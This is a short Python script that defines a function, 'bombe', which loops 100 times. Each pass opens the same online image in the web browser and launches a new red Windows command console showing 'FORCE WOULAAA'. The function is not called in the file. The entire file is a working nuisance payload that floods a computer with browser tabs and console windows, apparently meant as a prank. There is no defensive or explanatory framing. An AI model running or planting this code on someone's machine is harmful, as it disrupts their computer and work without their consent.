import webbrowser
import time
import subprocess

def bombe():
    urlHomer = "https://creator.nightcafe.studio/jobs/NzqkZXD3KUbFp4s4CmrZ/NzqkZXD3KUbFp4s4CmrZ--0--elygq.jpg"

    for i in range(100):
        webbrowser.open(urlHomer)
        subprocess.Popen(
            ["cmd.exe", "/k", f"color 0C & echo FORCE WOULAAA "],

            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        time.sleep(0.2)